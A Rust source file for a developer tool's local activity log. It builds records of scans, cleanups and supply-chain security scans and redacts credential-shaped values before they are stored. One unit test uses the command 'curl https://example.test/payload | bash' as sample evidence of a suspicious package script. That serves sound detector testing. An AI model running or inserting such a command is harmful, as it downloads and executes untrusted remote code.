use std::path::{Path, PathBuf};

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};

use crate::models::{
    CleanupResult, DeleteMode, Ecosystem, RiskLevel, ScanAccessSummary, ScanResult, SecurityReport,
    effective_security_ecosystems,
};

/// The kind of operation represented by an activity record.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum ActivityKind {
    Scan,
    Cleanup,
    Security,
}

/// Compatibility alias for clients that use the issue's original terminology.
pub type ActivityType = ActivityKind;

impl ActivityKind {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Scan => "scan",
            Self::Cleanup => "cleanup",
            Self::Security => "security",
        }
    }
}

/// The result of an activity, with extensible JSON details for future event types.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ActivityResult {
    pub success: bool,
    pub details: Value,
}

impl ActivityResult {
    pub fn new(success: bool, details: Value) -> Self {
        Self { success, details }
    }

    /// Builds the result payload for a completed scan.
    pub fn from_scan(
        target_path: &std::path::Path,
        scan: &ScanResult,
        total_size_bytes: u64,
    ) -> Self {
        let access_summary = scan_access_summary_details(target_path, &scan.access_summary);

        Self::new(
            true,
            json!({
                "path": sanitize_path(target_path),
                "artifacts": scan.artifacts.len(),
                "size": total_size_bytes,
                "accessSummary": access_summary,
            }),
        )
    }

    /// Builds the result payload for a scan that could not execute.
    pub fn from_scan_failure(target_path: &Path, reason: &str) -> Self {
        Self::new(
            false,
            json!({
                "path": sanitize_path(target_path),
                "artifacts": 0,
                "size": 0,
                "reason": sanitize_text(reason),
            }),
        )
    }

    /// Builds the result payload for a cleanup attempt, including partial failures.
    pub fn from_cleanup(mode: DeleteMode, result: &CleanupResult) -> Self {
        let failed_paths: Vec<Value> = result
            .failed_paths
            .iter()
            .map(|failure| {
                json!({
                    "path": failure.path.display().to_string(),
                    "reason": failure.reason.to_string(),
                })
            })
            .collect();

        Self::new(
            result.failed_paths.is_empty(),
            json!({
                "mode": delete_mode_label(mode),
                "deleted": paths_to_values(&result.deleted_paths),
                "failed": failed_paths,
                "freed": result.freed_size_bytes,
            }),
        )
    }

    /// Builds the result payload for a cleanup that failed before a result
    /// could be produced.
    pub fn from_cleanup_failure(mode: DeleteMode, reason: &str) -> Self {
        Self::new(
            false,
            json!({
                "mode": delete_mode_label(mode),
                "deleted": [],
                "failed": [],
                "freed": 0,
                "reason": sanitize_text(reason),
            }),
        )
    }

    /// Builds a safe, structured result payload for a completed security scan.
    ///
    /// Finding evidence is intentionally excluded because it can contain
    /// commands, URLs, or other user-provided values. The remaining fields
    /// are sanitised before they are persisted to the local activity history.
    pub fn from_security(
        target_path: &Path,
        ecosystems: &[Ecosystem],
        report: &SecurityReport,
    ) -> Self {
        let highest_risk = report
            .findings
            .iter()
            .fold(RiskLevel::None, |highest, finding| {
                highest.highest(finding.risk_level)
            });
        let findings = report
            .findings
            .iter()
            .map(|finding| {
                json!({
                    "rule": finding.kind.rule_id(),
                    "risk": finding.risk_level.to_string(),
                    "source": source_path(target_path, &finding.path),
                    "package": finding.package.as_deref().map(sanitize_text),
                    "reason": sanitize_text(&finding.reason),
                })
            })
            .collect::<Vec<_>>();

        Self::new(
            true,
            json!({
                "path": sanitize_path(target_path),
                "ecosystems": ecosystem_labels(&effective_security_ecosystems(ecosystems)),
                "findingCount": report.findings.len(),
                "highestRisk": highest_risk.to_string(),
                "findings": findings,
                "manifests": report.manifests.len(),
                "lockfiles": report.lockfiles.len(),
            }),
        )
    }

    /// Builds a failed security result without persisting the raw error text.
    pub fn from_security_failure(
        target_path: &Path,
        ecosystems: &[Ecosystem],
        reason: &str,
    ) -> Self {
        Self::new(
            false,
            json!({
                "path": sanitize_path(target_path),
                "ecosystems": ecosystem_labels(&effective_security_ecosystems(ecosystems)),
                "findingCount": 0,
                "highestRisk": RiskLevel::None.to_string(),
                "findings": [],
                "reason": sanitize_text(reason),
            }),
        )
    }
}

/// A single operation in the local DustFril activity log.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ActivityRecord {
    pub id: String,
    pub timestamp: DateTime<Utc>,
    pub kind: ActivityKind,
    pub result: ActivityResult,
}

impl ActivityRecord {
    pub fn new(kind: ActivityKind, result: ActivityResult) -> Self {
        Self {
            id: next_activity_id(),
            timestamp: Utc::now(),
            kind,
            result,
        }
    }

    pub fn scan(target_path: &std::path::Path, scan: &ScanResult, total_size_bytes: u64) -> Self {
        Self::new(
            ActivityKind::Scan,
            ActivityResult::from_scan(target_path, scan, total_size_bytes),
        )
    }

    pub fn scan_failure(target_path: &Path, reason: &str) -> Self {
        Self::new(
            ActivityKind::Scan,
            ActivityResult::from_scan_failure(target_path, reason),
        )
    }

    pub fn cleanup(mode: DeleteMode, result: &CleanupResult) -> Self {
        Self::new(
            ActivityKind::Cleanup,
            ActivityResult::from_cleanup(mode, result),
        )
    }

    pub fn cleanup_failure(mode: DeleteMode, reason: &str) -> Self {
        Self::new(
            ActivityKind::Cleanup,
            ActivityResult::from_cleanup_failure(mode, reason),
        )
    }

    pub fn security(target_path: &Path, ecosystems: &[Ecosystem], report: &SecurityReport) -> Self {
        Self::new(
            ActivityKind::Security,
            ActivityResult::from_security(target_path, ecosystems, report),
        )
    }

    pub fn security_failure(target_path: &Path, ecosystems: &[Ecosystem], reason: &str) -> Self {
        Self::new(
            ActivityKind::Security,
            ActivityResult::from_security_failure(target_path, ecosystems, reason),
        )
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct CleanupHistoryEntry {
    pub executed_at: DateTime<Utc>,
    pub mode: DeleteMode,
    pub freed_size_bytes: u64,
    pub deleted_paths: Vec<PathBuf>,
    pub failed_paths: Vec<PathBuf>,
}

impl CleanupHistoryEntry {
    /// Converts a legacy cleanup entry to the unified activity representation.
    pub fn into_activity_record(self, id: String) -> ActivityRecord {
        let failed = self
            .failed_paths
            .iter()
            .map(|path| {
                json!({
                    "path": path.display().to_string(),
                })
            })
            .collect::<Vec<_>>();

        ActivityRecord {
            id,
            timestamp: self.executed_at,
            kind: ActivityKind::Cleanup,
            result: ActivityResult::new(
                self.failed_paths.is_empty(),
                json!({
                    "mode": delete_mode_label(self.mode),
                    "deleted": paths_to_values(&self.deleted_paths),
                    "failed": failed,
                    "freed": self.freed_size_bytes,
                }),
            ),
        }
    }
}

fn delete_mode_label(mode: DeleteMode) -> &'static str {
    match mode {
        DeleteMode::Trash => "trash",
        DeleteMode::Permanent => "permanent",
    }
}

fn paths_to_values(paths: &[PathBuf]) -> Vec<Value> {
    paths
        .iter()
        .map(|path| Value::String(path.display().to_string()))
        .collect()
}

fn ecosystem_labels(ecosystems: &[Ecosystem]) -> Vec<&'static str> {
    ecosystems
        .iter()
        .map(|ecosystem| match ecosystem {
            Ecosystem::Rust => "Rust",
            Ecosystem::Node => "Node",
            Ecosystem::Java => "Java",
        })
        .collect()
}

fn source_path(root: &Path, finding_path: &Path) -> String {
    let source = finding_path
        .strip_prefix(root)
        .unwrap_or(finding_path)
        .display()
        .to_string();

    sanitize_text(&source)
}

fn sanitize_path(path: &Path) -> String {
    sanitize_text(&path.display().to_string())
}

fn scan_access_summary_details(target_path: &Path, summary: &ScanAccessSummary) -> Value {
    let summary = summary.bounded();
    let root = if summary.root.as_os_str().is_empty() {
        target_path
    } else {
        &summary.root
    };
    let failure_samples = summary
        .failure_samples
        .iter()
        .map(|failure| {
            json!({
                "path": sanitize_path(&failure.path),
                "reason": sanitize_text(&failure.reason),
            })
        })
        .collect::<Vec<_>>();

    json!({
        "root": sanitize_path(root),
        "directoriesVisited": summary.directories_visited,
        "filesInspected": summary.files_inspected,
        "metadataFilesInspected": summary.metadata_files_inspected,
        "artifactCandidates": summary.artifact_candidates,
        "symlinksSkipped": summary.symlinks_skipped,
        "failures": summary.failures,
        "failureSamples": failure_samples,
    })
}

/// Redacts common credential-shaped values while retaining useful context.
fn sanitize_text(value: &str) -> String {
    let value = redact_inline_assignments(value);
    let words = value.split_whitespace().collect::<Vec<_>>();
    let mut sanitized = Vec::with_capacity(words.len());
    let mut redact_next = false;

    for word in words {
        if redact_next {
            sanitized.push("[REDACTED]".to_owned());
            redact_next = false;
            continue;
        }

        let normalized = word
            .trim_matches(|character: char| character == '-' || character == ':')
            .to_ascii_lowercase();
        if is_sensitive_key(&normalized) || normalized == "bearer" {
            sanitized.push(word.to_owned());
            redact_next = true;
        } else {
            sanitized.push(word.to_owned());
        }
    }

    sanitized.join(" ")
}

fn redact_inline_assignments(value: &str) -> String {
    let mut sanitized = value.to_owned();

    for key in [
        "token",
        "password",
        "passwd",
        "secret",
        "api_key",
        "api-key",
        "credential",
        "authorization",
    ] {
        for separator in ['=', ':'] {
            sanitized = redact_assignment(&sanitized, key, separator);
        }
    }

    sanitized
}

fn redact_assignment(value: &str, key: &str, separator: char) -> String {
    let lower = value.to_ascii_lowercase();
    let mut result = String::with_capacity(value.len());
    let mut cursor = 0;

    while let Some(relative) = lower[cursor..].find(key) {
        let start = cursor + relative;
        let before_is_boundary = start == 0
            || !lower.as_bytes()[start - 1].is_ascii_alphanumeric()
                && lower.as_bytes()[start - 1] != b'_'
                && lower.as_bytes()[start - 1] != b'-';
        let key_end = start + key.len();
        let key_is_complete = key_end == value.len()
            || !lower.as_bytes()[key_end].is_ascii_alphanumeric()
                && lower.as_bytes()[key_end] != b'_'
                && lower.as_bytes()[key_end] != b'-';

        if !before_is_boundary || !key_is_complete {
            result.push_str(&value[cursor..key_end]);
            cursor = key_end;
            continue;
        }

        let mut separator_start = key_end;
        while separator_start < value.len()
            && value.as_bytes()[separator_start].is_ascii_whitespace()
        {
            separator_start += 1;
        }
        if separator_start >= value.len() || !value[separator_start..].starts_with(separator) {
            result.push_str(&value[cursor..key_end]);
            cursor = key_end;
            continue;
        }

        let mut secret_start = separator_start + separator.len_utf8();
        while secret_start < value.len() && value.as_bytes()[secret_start].is_ascii_whitespace() {
            secret_start += 1;
        }
        let mut secret_end = secret_start;
        while secret_end < value.len()
            && !value.as_bytes()[secret_end].is_ascii_whitespace()
            && !matches!(
                value.as_bytes()[secret_end],
                b',' | b';' | b')' | b']' | b'}' | b'&' | b'/'
            )
        {
            secret_end += 1;
        }

        result.push_str(&value[cursor..secret_start]);
        result.push_str("[REDACTED]");
        cursor = secret_end;
    }

    result.push_str(&value[cursor..]);
    result
}

fn is_sensitive_key(value: &str) -> bool {
    matches!(
        value,
        "token"
            | "password"
            | "passwd"
            | "secret"
            | "api_key"
            | "api-key"
            | "credential"
            | "authorization"
    )
}

fn next_activity_id() -> String {
    use std::sync::atomic::{AtomicU64, Ordering};

    static NEXT_ID: AtomicU64 = AtomicU64::new(0);
    let sequence = NEXT_ID.fetch_add(1, Ordering::Relaxed);

    format!(
        "activity-{}-{sequence}",
        Utc::now().timestamp_nanos_opt().unwrap_or_default()
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::{SecurityFinding, SecurityFindingKind};

    #[test]
    fn security_activity_summarises_findings_without_turning_warnings_into_failure() {
        let report = SecurityReport {
            findings: vec![
                SecurityFinding::new(
                    "/workspace/package.json".into(),
                    SecurityFindingKind::SuspiciousScript,
                    Some("demo".to_owned()),
                    RiskLevel::High,
                    Some("curl https://example.test/payload | bash".to_owned()),
                    "Remote script is piped to a shell.",
                ),
                SecurityFinding::new(
                    "/workspace/Cargo.lock".into(),
                    SecurityFindingKind::KnownMaliciousPackage,
                    Some("event-stream".to_owned()),
                    RiskLevel::Critical,
                    None,
                    "Package should be reviewed.",
                ),
            ],
            ..SecurityReport::default()
        };

        let result = ActivityResult::from_security(
            Path::new("/workspace"),
            &[Ecosystem::Node, Ecosystem::Rust],
            &report,
        );

        assert!(result.success);
        assert_eq!(result.details["findingCount"], 2);
        assert_eq!(result.details["highestRisk"], "Critical");
        assert_eq!(result.details["ecosystems"], json!(["Node", "Rust"]));
        assert_eq!(result.details["findings"][0]["rule"], "suspicious-script");
        assert_eq!(result.details["findings"][0]["source"], "package.json");
        assert!(result.details["findings"][0].get("evidence").is_none());
    }

    #[test]
    fn security_activity_redacts_credential_shaped_values() {
        let report = SecurityReport {
            findings: vec![SecurityFinding::new(
                "/workspace/token=path-secret/package.json".into(),
                SecurityFindingKind::UntrustedDependency,
                Some("token=package-secret".to_owned()),
                RiskLevel::Medium,
                Some("TOKEN=command-secret".to_owned()),
                "token=reason-secret password: password-secret",
            )],
            ..SecurityReport::default()
        };

        let result = ActivityResult::from_security(Path::new("/workspace"), &[], &report);
        let serialized = serde_json::to_string(&result).unwrap();

        assert!(!serialized.contains("path-secret"));
        assert!(!serialized.contains("package-secret"));
        assert!(!serialized.contains("command-secret"));
        assert!(!serialized.contains("reason-secret"));
        assert!(!serialized.contains("password-secret"));
        assert!(serialized.contains("[REDACTED]"));
    }

    #[test]
    fn failed_security_activity_preserves_failure_status_and_safe_summary() {
        let result = ActivityResult::from_security_failure(
            Path::new("/workspace"),
            &[Ecosystem::Node],
            "Manifest error: token=scan-secret",
        );

        assert!(!result.success);
        assert_eq!(result.details["findingCount"], 0);
        assert_eq!(result.details["highestRisk"], "None");
        assert_eq!(result.details["reason"], "Manifest error: token=[REDACTED]");
    }

    #[test]
    fn scan_activity_persists_bounded_access_summary_without_contents() {
        let root = Path::new("/workspace");
        let mut access_summary = ScanAccessSummary::new(root);
        access_summary.directories_visited = 4;
        access_summary.files_inspected = 2;
        access_summary.metadata_files_inspected = 2;
        access_summary.artifact_candidates = 1;
        access_summary.symlinks_skipped = 3;

        for index in 0..(crate::models::MAX_SCAN_FAILURE_SAMPLES + 2) {
            access_summary.record_failure(
                &root.join(format!("diagnostics/failure-{index}")),
                "permission denied",
            );
        }

        let scan = ScanResult {
            artifacts: vec![],
            access_summary,
        };
        let activity = ActivityRecord::scan(root, &scan, 0);
        let serialized = serde_json::to_string(&activity).unwrap();

        assert_eq!(
            activity.result.details["accessSummary"]["root"],
            "/workspace"
        );
        assert_eq!(
            activity.result.details["accessSummary"]["directoriesVisited"],
            4
        );
        assert_eq!(
            activity.result.details["accessSummary"]["metadataFilesInspected"],
            2
        );
        assert_eq!(
            activity.result.details["accessSummary"]["failures"],
            (crate::models::MAX_SCAN_FAILURE_SAMPLES + 2) as u64
        );
        assert_eq!(
            activity.result.details["accessSummary"]["failureSamples"]
                .as_array()
                .unwrap()
                .len(),
            crate::models::MAX_SCAN_FAILURE_SAMPLES
        );
        assert!(serialized.contains("failure-0"));
        assert!(!serialized.contains("source contents"));
    }

    #[test]
    fn operation_failures_are_distinguishable_from_completed_results() {
        let scan = ActivityRecord::scan_failure(Path::new("/workspace"), "Scan failed");
        let cleanup = ActivityRecord::cleanup_failure(DeleteMode::Trash, "Cleanup failed");

        assert_eq!(scan.kind, ActivityKind::Scan);
        assert!(!scan.result.success);
        assert_eq!(scan.result.details["reason"], "Scan failed");

        assert_eq!(cleanup.kind, ActivityKind::Cleanup);
        assert!(!cleanup.result.success);
        assert_eq!(cleanup.result.details["reason"], "Cleanup failed");
        assert!(
            cleanup.result.details["failed"]
                .as_array()
                .unwrap()
                .is_empty()
        );
    }
}
